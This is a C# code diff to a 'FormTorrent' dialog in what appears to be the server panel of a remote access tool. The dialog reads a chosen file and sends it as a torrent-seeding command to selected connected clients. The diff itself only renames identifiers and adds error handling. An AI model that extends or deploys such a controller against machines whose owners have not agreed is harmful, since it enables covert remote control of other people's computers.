@@ -1,5 +1,5 @@
 ﻿using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -16,7 +16,7 @@ namespace Server.Forms
 {
     public partial class FormTorrent : Form
     {
-        private bool isOk = false;
+        private bool IsOk = false;
         public FormTorrent()
         {
             InitializeComponent();
@@ -29,12 +29,12 @@ namespace Server.Forms
             if (openFileDialog.ShowDialog() == DialogResult.OK)
             {
                 textBox1.Text = openFileDialog.FileName;
-                isOk = true;
+                IsOk = true;
             }
             else
             {
                 textBox1.Text = "";
-                isOk = false;
+                IsOk = false;
             }
         }
 
@@ -45,17 +45,21 @@ namespace Server.Forms
 
         private void Button2_Click(object sender, EventArgs e)
         {
-            if (!isOk) return;
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "torrent";
-            msgpack.ForcePathObject("Option").AsString = "seed";
-            msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(textBox1.Text));
-            foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
+            try
             {
-                Clients client = (Clients)itm.Tag;
-                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                if (!IsOk) return;
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "torrent";
+                msgpack.ForcePathObject("Option").AsString = "seed";
+                msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(textBox1.Text));
+                foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
+                {
+                    Clients client = (Clients)itm.Tag;
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                }
+                this.Close();
             }
-            this.Close();
+            catch (Exception ex) { MessageBox.Show(ex.Message); }
         }
     }
 }
